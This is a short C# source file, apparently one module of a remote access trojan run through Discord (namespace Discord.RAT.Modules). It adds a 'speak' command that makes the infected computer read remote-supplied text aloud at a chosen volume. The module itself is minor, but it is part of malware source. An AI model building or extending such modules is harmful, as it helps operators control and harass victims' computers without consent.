using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Speech.Synthesis;
using System.Text;
using System.Threading.Tasks;

namespace Discord.RAT.Modules
{
    public class Speak : ModuleBase
    {
        [Command("speak", RunMode = RunMode.Async)]

        public async Task SpeakTxt(int vol, [Remainder] string text)
        {
            SpeechSynthesizer speak = new SpeechSynthesizer
            {
                Volume = vol
            };
            speak.SpeakAsync(text);


            await ReplyAsync("Sent!");
        }
    }
}
